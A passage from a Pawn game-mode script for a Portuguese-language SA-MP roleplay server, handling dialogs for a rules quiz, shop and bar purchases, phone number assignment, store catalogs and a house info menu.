		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");

		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se os teus amigos te pedirem boleia pelo TeamSpeak, o que deverás fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Devo não lhe dar boleia, porque é contra as regras"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ir o mais rápido possível"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Devo reportá-lo no forum"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Todas as alineas são válidas"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO6, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1: // certa
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se levares Admin Jail o que deves fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Insultar o Administrador que te deu AJ"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ir chorar para o fórum"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os actos cometidos"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Sair do servidor e nunca mais voltar"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO7, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 2:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 3:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: 
				{
                    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
		    }
		}
		case DIALOG_QUESTIONARIO7:
		{
		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");

		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Se levares Admin Jail o que deves fazer?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Insultar o Administrador que te deu AJ"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Ir chorar para o fórum"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Esperar que o tempo de AJ termine e refletir sobre os actos cometidos"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Sair do servidor e nunca mais voltar"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO7, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 2:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 3:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual destes RP's não é válido?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/tentar abrir a lata de Coca-Cola"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/do Dor na perna direita"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/me aponta a arma ao sujeito e dispara"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/me tenta abrir a porta com um pontapé mas falha"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO8, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
				}
				case 4:
				{
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
		    }
		}
		case DIALOG_QUESTIONARIO8:
		{
		    if(!response) return KickPlayer(playerid, "Doge", "Não quis responder ao questionário.");
		    
		    switch(listitem)
		    {
		        case 0:
		        {
					format(string, sizeof(string), "{99FF00}[PERGUNTA:] {00FFFB}Qual destes RP's não é válido?"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/tentar abrir a lata de Coca-Cola"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/do Dor na perna direita"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/me aponta a arma ao sujeito e dispara"); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}/me tenta abrir a porta com um pontapé mas falha"); strcat(sdialog,string);

					return ShowPlayerDialog(playerid, DIALOG_QUESTIONARIO8, DIALOG_STYLE_LIST, "QUESTIONÁRIO", sdialog, "Selecionar", "Sair");
		        }
		        case 1:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 2:
		        {
				    pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
		        }
		        case 3:
		        {
		            pInfo[playerid][TutFalhado]++; KickPlayer(playerid, "Doge", "Errou no questionário."); return 1;
				}
				case 4: // certa
				{
				    AfterTutorial(playerid);
				}
		    }
		    return 1;
		}
	    case DIALOG_LOJA_MENU:
	    {
	        if(!response) return 1;
	        
	        new bID = GetPlayerVirtualWorld(playerid);
	        
	        switch(listitem)
	        {
	            case 0: // info loja
	            {
			    	format(string, sizeof(string), "{FF9900}    [ {00FF00}INFORMAÇÃO SOBRE A LOJA {FF9900}]                  "); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n\n{FF9900}Nome da loja: {FFFFFF}%s", bInfo[bID][Nome]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Preço de Entrada: {FFFFFF}%d$", bInfo[bID][Entrada]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Produtos: {FFFFFF}%d", bInfo[bID][Produtos]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Banco: {FFFFFF}%d", bInfo[bID][Bank]); strcat(sdialog,string);
			    	
	                return ShowPlayerDialog(playerid, DIALOG_LOJA_INFO, DIALOG_STYLE_MSGBOX, "Info Loja", sdialog, "Ok", "");
	            }
	            case 1: // preço de entrada
	            {
	                return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "{FFFF00}PREÇO DE ENTRADA", "{FFFFFF}Introduz o preço de entrada", "Escolher", "Sair");
	            }
	            case 2: // nome da loja
	            {
	                return ShowPlayerDialog(playerid, DIALOG_LOJA_NOME, DIALOG_STYLE_INPUT, "{FFFF00}NOME DA LOJA", "{FFFFFF}Introduz o novo nome da loja. Isto vai custar-te 5000$.", "Escolher", "Sair");
	            }
	            case 3: // extrair loja
	            {
	                return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
	            }
	            case 4: // preço seguradora
	            {
                    return ShowPlayerDialog(playerid, DIALOG_LOJA_SEGURADORA, DIALOG_STYLE_INPUT, "{FFFF00}SEGURADORA", "{FFFFFF}Introduz o montante.", "Escolher", "Sair");
	            }
	        }
	        return 1;
	    }
	    case DIALOG_LOJA_INFO: { return 1; }
	    case DIALOG_LOJA_ENTRADA:
	    {
	        if(!response) return 1;
	        
	        if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DE ENTRADA", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço de entrada", "Escolher", "Sair");
			new entrada = strval(inputtext);
			if(entrada < 0 || entrada > 1000) return ShowPlayerDialog(playerid, DIALOG_LOJA_ENTRADA, DIALOG_STYLE_INPUT, "PREÇO DE ENTRADA", "{FF0000}Preço inválido. {FFFFFF}Introduz o preço de entrada", "Escolher", "Sair");
			
			new bID = GetPlayerVirtualWorld(playerid);
			
			bInfo[bID][Entrada] = entrada;
			
			GuardarBizz(bID);
			AtualizarBiz(bID);
			
			format(string, sizeof(string), "Alteraste o preço de entrada da tua loja para %d$", entrada);
			SendClientMessage(playerid, COLOR_INFO, string);
			
			return 1;
	    }
	    case DIALOG_LOJA_NOME:
	    {
	        if(!response) return 1;
	        if(strlen(inputtext) > 16) return ShowPlayerDialog(playerid, DIALOG_LOJA_NOME, DIALOG_STYLE_INPUT, "NOME DA LOJA", "{FF0000}O nome tem de ter menos de 16 letras. {FFFFFF}Introduz o novo nome da loja. Isto vai custar-te 5000$.", "Escolher", "Sair");
	        
	        new bID = GetPlayerVirtualWorld(playerid);
	        
	        format(bInfo[bID][Nome], 32, "%s", inputtext);
	        
	        GuardarBizz(bID);
	        AtualizarBiz(bID);
	        
  			format(string, sizeof(string), "Alteraste o nome da tua loja para %s", inputtext);
			SendClientMessage(playerid, COLOR_INFO, string);
			
			return 1;
	    }
	    case DIALOG_LOJA_EXTRAIR:
		{
		    if(!response) return 1;
		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
		    
		    new dinheiro = strval(inputtext);
		    new bID = GetPlayerVirtualWorld(playerid);
		    
		    if(dinheiro < 0) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
		    if(bInfo[bID][Bank] < dinheiro) return ShowPlayerDialog(playerid, DIALOG_LOJA_EXTRAIR, DIALOG_STYLE_INPUT, "{FFFF00}EXTRAIR LOJA", "{FF0000}Não tens esse dinheiro na loja. {FFFFFF}Introduz o montante que deseja extrair.", "Escolher", "Sair");
		    
		    bInfo[bID][Bank] -= dinheiro;
		    GivePlayerMoneyEx(playerid, dinheiro);
		    
            PlayerActionMessage(playerid, 15.0, "tira algum dinheiro do cofre da loja.");
            
            return 1;
		}
	    case DIALOG_LOJA_SEGURADORA:
	    {
	        if(!response) return 1;
   		    if(!IsNumeric(inputtext)) return ShowPlayerDialog(playerid, DIALOG_LOJA_SEGURADORA, DIALOG_STYLE_INPUT, "{FFFF00}SEGURADORA", "{FF0000}Montante inválido. {FFFFFF}Introduz o montante.", "Escolher", "Sair");

			new dinheiro = strval(inputtext);
			new bID = GetPlayerVirtualWorld(playerid);
			
			if(dinheiro < 100 || dinheiro > 500) return ShowPlayerDialog(playerid, DIALOG_LOJA_SEGURADORA, DIALOG_STYLE_INPUT, "{FFFF00}SEGURADORA", "{FF0000}Montante inválido (100-500). {FFFFFF}Introduz o montante.", "Escolher", "Sair");

			bInfo[bID][Seguradora] = dinheiro;
			GuardarBizz(bID);
			
			format(string, sizeof(string), "Alteraste a mensalidade da tua seguradora para {FF9900}%d$", dinheiro);
			SendClientMessage(playerid, COLOR_INFO, string);

	        return 1;
	    }
	    case DIALOG_LOJA_REST:
	    {
	        if(!response) return 1;
	        
			new bID = GetPlayerVirtualWorld(playerid);
			
			if(bInfo[bID][Type] != BTYPE_RESTAURANTE) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Restaurante");
			if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
			
			ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
			
	        switch(listitem)
	        {
	            case 0: // pizza
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_PIZZA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	                
					PlayerActionMessage(playerid, 15.0, "come uma pizza.");
					ApplyAnimation(playerid, "FOOD", "EAT_Pizza", 4.1, 0, 1, 1, 0, 2000, 1);
					
					new Float:health;
					GetPlayerHealth(playerid, health);
					
					if((health + 35) < 100)
					{
    					SetPlayerHealthEx(playerid, 35, 1);
					}
					
				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_PIZZA);
					bInfo[bID][Bank] += PRECO_COMIDA_PIZZA;
					
					format(string, sizeof(string), "Comeste uma pizza por %d$", PRECO_COMIDA_PIZZA);
					SendClientMessage(playerid, COLOR_INFO, string);
	            }
	            case 1: // hamburger
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_HAMB) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	                
                    PlayerActionMessage(playerid, 15.0, "come um hamburguer.");
                    ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
					
					new Float:health;
					GetPlayerHealth(playerid, health);

					if((health + 25) < 100)
					{
    					SetPlayerHealthEx(playerid, 25, 1);
					}
					
				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_HAMB);
					bInfo[bID][Bank] += PRECO_COMIDA_HAMB;
					
					format(string, sizeof(string), "Comeste um hamburguer por %d$", PRECO_COMIDA_HAMB);
					SendClientMessage(playerid, COLOR_INFO, string);
	            }
	            case 2: // bifanas
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_BIFANAS) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	                
                    PlayerActionMessage(playerid, 15.0, "come umas bifanas.");
                    ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
                    
					new Float:health;
					GetPlayerHealth(playerid, health);

					if((health + 10) < 100)
					{
    					SetPlayerHealthEx(playerid, 10, 1);
					}
                    
				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_BIFANAS);
					bInfo[bID][Bank] += PRECO_COMIDA_BIFANAS;
					
					format(string, sizeof(string), "Comeste umas bifanas por %d$", PRECO_COMIDA_BIFANAS);
					SendClientMessage(playerid, COLOR_INFO, string);
	            }
	            case 3: // taco
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_TACO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	                
                    PlayerActionMessage(playerid, 15.0, "come um taco.");
                    ApplyAnimation(playerid, "FOOD", "EAT_Chicken",4.1, 0, 1, 1, 0, 2000, 1);
                    
					new Float:health;
					GetPlayerHealth(playerid, health);

					if((health + 15) < 100)
					{
    					SetPlayerHealthEx(playerid, 15, 1);
					}
                    
				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_TACO);
					bInfo[bID][Bank] += PRECO_COMIDA_TACO;
					
					format(string, sizeof(string), "Comeste um taco por %d$", PRECO_COMIDA_TACO);
					SendClientMessage(playerid, COLOR_INFO, string);
	            }
	            case 4: // sande
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_COMIDA_SANDE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	                
                    PlayerActionMessage(playerid, 15.0, "come uma sande.");
                    ApplyAnimation(playerid, "FOOD", "EAT_Burger",4.1, 0, 1, 1, 0, 2000, 1);
                    
 					new Float:health;
					GetPlayerHealth(playerid, health);

					if((health + 6) < 100)
					{
    					SetPlayerHealthEx(playerid, 6, 1);
					}
                    
				 	GivePlayerMoneyEx(playerid, -PRECO_COMIDA_SANDE);
					bInfo[bID][Bank] += PRECO_COMIDA_SANDE;
					
					format(string, sizeof(string), "Comeste uma sande por %d$", PRECO_COMIDA_SANDE);
					SendClientMessage(playerid, COLOR_INFO, string);
	            }
			}

			bInfo[bID][Produtos]--;

			return 1;
	    }
	    case DIALOG_LOJA_BAR:
	    {
	        if(!response) return 1;

			new bID = GetPlayerVirtualWorld(playerid);

			if(bInfo[bID][Type] != BTYPE_BAR) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás num Bar");
			if(bInfo[bID][Produtos] == 0) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Essa loja não tem produtos");
			
			ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);

	        switch(listitem)
	        {
	            case 0: // Cerveja
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_CERVEJA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe uma cerveja.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_CERVEJA);
					bInfo[bID][Bank] += PRECO_BEBIDA_CERVEJA;

					format(string, sizeof(string), "Bebeste uma cerveja por %d$", PRECO_BEBIDA_CERVEJA);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 1;
	            }
	            case 1: // Tequilla
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_TEQUILLA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe uma tequilla.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_TEQUILLA);
					bInfo[bID][Bank] += PRECO_BEBIDA_TEQUILLA;

					format(string, sizeof(string), "Bebeste uma tequilla por %d$", PRECO_BEBIDA_TEQUILLA);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 3;
	            }
	            case 2: // Vodka
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_VODKA) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe uma vodka.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_VODKA);
					bInfo[bID][Bank] += PRECO_BEBIDA_VODKA;

					format(string, sizeof(string), "Bebeste uma vodka por %d$", PRECO_BEBIDA_VODKA);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 3;
	            }
	            case 3: // Whiskey
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_WHISKEY) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe um whiskey.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_WHISKEY);
					bInfo[bID][Bank] += PRECO_BEBIDA_WHISKEY;

					format(string, sizeof(string), "Bebeste um whiskey por %d$", PRECO_BEBIDA_WHISKEY);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 4;
	            }
	            case 4: // Champagne
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_CHAMPAGNE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe um champagne.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_CHAMPAGNE);
					bInfo[bID][Bank] += PRECO_BEBIDA_CHAMPAGNE;

					format(string, sizeof(string), "Bebeste um champagne por %d$", PRECO_BEBIDA_CHAMPAGNE);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 2;
	            }
	            case 5: // Bagaço
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_BAGACO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe um bagaço.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_BAGACO);
					bInfo[bID][Bank] += PRECO_BEBIDA_BAGACO;

					format(string, sizeof(string), "Bebeste um bagaço por %d$", PRECO_BEBIDA_BAGACO);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 5;
	            }
	            case 6: // Vinho Tinto
	            {
	                if(GetPlayerMoneyEx(playerid) < PRECO_BEBIDA_TINTO) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);

					PlayerActionMessage(playerid, 15.0, "bebe um vinho tinto.");
					ApplyAnimation(playerid, "VENDING", "VEND_Drink_P",4.1, 0, 1, 1, 0, 2000, 1);

				 	GivePlayerMoneyEx(playerid, -PRECO_BEBIDA_TINTO);
					bInfo[bID][Bank] += PRECO_BEBIDA_TINTO;

					format(string, sizeof(string), "Bebeste um vinho tinto por %d$", PRECO_BEBIDA_TINTO);
					SendClientMessage(playerid, COLOR_INFO, string);
					
					DrunkLevel[playerid] += 2;
	            }
			}
			
	 		switch(DrunkLevel[playerid])
		 	{
		 	    case 1: { SetPlayerDrunkLevel(playerid, 500); }
		 	    case 2: { SetPlayerDrunkLevel(playerid, 1000); }
		 	    case 3: { SetPlayerDrunkLevel(playerid, 1500); }
		 	    case 4: { SetPlayerDrunkLevel(playerid, 2000); }
		 	    case 5: { SetPlayerDrunkLevel(playerid, 2500); }
		 	    case 6: { SetPlayerDrunkLevel(playerid, 3000); }
		 	    case 7: { SetPlayerDrunkLevel(playerid, 3500); }
		 	    case 8: { SetPlayerDrunkLevel(playerid, 5000); }
		 	    default: { SetPlayerDrunkLevel(playerid, 50000); }
		 	}
		 	
		 	bInfo[bID][Produtos]--;
		 	TimerDrunk[playerid] = SetTimerEx("MenosDrunk", 30000, true, "i", playerid);

	        return 1;
	    }
		case DIALOG_LOJA_TELE:
		{
	        if(!response) return 1;
	        
	        new bID = GetPlayerVirtualWorld(playerid);
	        
	        if(GetPlayerMoneyEx(playerid) < PRECO_TELE) return SendClientMessage(playerid, COLOR_ERRO, MSG_NOMONEY);
	        if(pObjects[playerid][Telemovel] == 1) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Já tens um telemóvel");
	        
	        ApplyActorAnimation(BizActor[GetPlayerVirtualWorld(playerid)], "INT_SHOP", "shop_cashier", 4.1, 0, 0, 0, 0, 3000);
	        GivePlayerMoneyEx(playerid, -PRECO_TELE);

            PlayerActionMessage(playerid, 15.0, "recebe uma caixa com um telemóvel lá dentro.");

	        pObjects[playerid][Telemovel] = 1;
	        bInfo[bID][Produtos]--;
	        
	        new numero[10];
			new rederand = random(3);
	        
	        if(pInfo[playerid][UID] > 0 && pInfo[playerid][UID] < 10) // 1 numero
	        {
				new n1 = random(10);
				new n2 = random(10);
				new n3 = random(10);
				new n4 = random(10);
				new n5 = random(10);
				new n6 = random(10);
				
				// xx123456x

				switch(rederand)
				{
				    case 0:
				    {
				        format(numero, sizeof(numero), "91%d%d%d%d%d%d%d", n1, n2, n3, n4, n5, n6, pInfo[playerid][UID]);
				    }
				    case 1:
				    {
                        format(numero, sizeof(numero), "96%d%d%d%d%d%d%d", n1, n2, n3, n4, n5, n6, pInfo[playerid][UID]);
					}
					case 2:
					{
						format(numero, sizeof(numero), "93%d%d%d%d%d%d%d", n1, n2, n3, n4, n5, n6, pInfo[playerid][UID]);
					}
				}
	        }
	        else if(pInfo[playerid][UID] > 10 && pInfo[playerid][UID] < 100) // 2 numero
	        {
				new n1 = random(10);
				new n2 = random(10);
				new n3 = random(10);
				new n4 = random(10);
				new n5 = random(10);

				// xx12345xx

				switch(rederand)
				{
				    case 0:
				    {
				        format(numero, sizeof(numero), "91%d%d%d%d%d%d", n1, n2, n3, n4, n5, pInfo[playerid][UID]);
				    }
				    case 1:
				    {
                        format(numero, sizeof(numero), "96%d%d%d%d%d%d", n1, n2, n3, n4, n5, pInfo[playerid][UID]);
					}
					case 2:
					{
						format(numero, sizeof(numero), "93%d%d%d%d%d%d", n1, n2, n3, n4, n5, pInfo[playerid][UID]);
					}
				}
	        }
	        else if(pInfo[playerid][UID] > 10 && pInfo[playerid][UID] < 100) // 3 numero
	        {
				new n1 = random(10);
				new n2 = random(10);
				new n3 = random(10);
				new n4 = random(10);

				// xx1234xxx

				switch(rederand)
				{
				    case 0:
				    {
				        format(numero, sizeof(numero), "91%d%d%d%d%d", n1, n2, n3, n4, pInfo[playerid][UID]);
				    }
				    case 1:
				    {
                        format(numero, sizeof(numero), "96%d%d%d%d%d", n1, n2, n3, n4, pInfo[playerid][UID]);
					}
					case 2:
					{
						format(numero, sizeof(numero), "93%d%d%d%d%d", n1, n2, n3, n4, pInfo[playerid][UID]);
					}
				}
	        }
	        else if(pInfo[playerid][UID] > 100 && pInfo[playerid][UID] < 1000) // 3 numero
	        {
				new n1 = random(10);
				new n2 = random(10);
				new n3 = random(10);

				// xx123xxxx

				switch(rederand)
				{
				    case 0:
				    {
				        format(numero, sizeof(numero), "91%d%d%d%d", n1, n2, n3, pInfo[playerid][UID]);
				    }
				    case 1:
				    {
                        format(numero, sizeof(numero), "96%d%d%d%d", n1, n2, n3, pInfo[playerid][UID]);
					}
					case 2:
					{
						format(numero, sizeof(numero), "93%d%d%d%d", n1, n2, n3, pInfo[playerid][UID]);
					}
				}
	        }
	        
	        pInfo[playerid][NumeroTelemovel] = strval(numero);
	        pInfo[playerid][Rede] = bID;
	        
	        format(string, sizeof(string), "Compraste um telemóvel da rede %s. O teu número é %d", bInfo[bID][Nome], pInfo[playerid][NumeroTelemovel]);

	        SendClientMessage(playerid, COLOR_INFO, string);
	        
	        return 1;
		}
		case DIALOG_LOJA_STAND:
		{
	        if(!response) return 1;

			switch(listitem)
			{
			    case 0:
			    {
			        ShowModelSelectionMenu(playerid, ListaCarros, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);

			        PlayerActionMessage(playerid, 15.0, "pega no catálogo e vé os veículos.");
			    }
			    case 1:
			    {
    				new bID = GetPlayerVirtualWorld(playerid);

					if(bInfo[bID][Type] != BTYPE_STAND) return SendClientMessage(playerid, COLOR_ERRO, "[ERRO:] {FFFFFF}Não estás no stand.");

		    		ShowModelSelectionMenu(playerid, ListaCarrosComprar, "Stand", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
	   			}
			}

	        return 1;
		}
		case DIALOG_LOJA_ROUPA:
		{
		    if(!response) return 1;
		    
			switch(listitem)
			{
			    case 0:
			    {
					ShowModelSelectionMenu(playerid, ListaSkins, "Roupas", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
					PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver as roupas.");
			    }
			    case 1:
			    {
					ShowModelSelectionMenu(playerid, ListaAcessorios, "Acessorios", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
					PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os acessórios.");
	   			}
			}
		    
		    return 1;
		}
		case DIALOG_LOJA_247:
		{
		    if(!response) return 1;

			switch(listitem)
			{
			    case 0:
			    {
					ShowModelSelectionMenu(playerid, ListaObjetosComprar, "24/7", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
					PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os produtos.");
			    }
			    case 1:
			    {
					ShowModelSelectionMenu(playerid, ListaObjetos, "24/7", COLOR_ORANGE, COLOR_OOC , COLOR_WHITE);
 					PlayerActionMessage(playerid, 15.0, "pega no catálogo e começa a ver os produtos.");
	   			}
			}

		    return 1;
		}
		case DIALOG_CASA_MENU:
		{
	        if(!response) return 1;

	        new hID = GetPlayerVirtualWorld(playerid);

	        switch(listitem)
	        {
	            case 0:
	            {
	                new aluguer[8];
	                
					switch(hInfo[hID][AluguerStatus])
					{
					    case 0: { aluguer = "Não"; }
					    case 1: { aluguer = "Sim"; }
					}
					
			    	format(string, sizeof(string), "{FF9900}    [ {00FF00}INFORMAÇÃO SOBRE A CASA {FF9900}]                  "); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n\n{FF9900}Descrição da casa: {FFFFFF}%s", hInfo[hID][Nome]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Aluguer: {FFFFFF}%s", aluguer); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Preço de Aluguer: {FFFFFF}%d$", hInfo[hID][Aluguer]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Cofre: {FFFFFF}%d$", hInfo[hID][Bank]); strcat(sdialog,string);
			    	format(string, sizeof(string), "\n{FF9900}Arma 1: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(hInfo[hID][Arma1]), hInfo[hID][Ammo1]); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Arma 2: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(hInfo[hID][Arma2]), hInfo[hID][Ammo2]); strcat(sdialog,string);
					format(string, sizeof(string), "\n{FF9900}Arma 3: {FFFFFF}%s {FF9900}Balas: {FFFFFF}%d", GetWeapName(hInfo[hID][Arma3]), hInfo[hID][Ammo3]); strcat(sdialog,string); // lol

	                return ShowPlayerDialog(playerid, DIALOG_CASA_INFO, DIALOG_STYLE_MSGBOX, "Info Loja", sdialog, "Ok", "");
	            }
	            case 1: // ativar aluguer
	            {
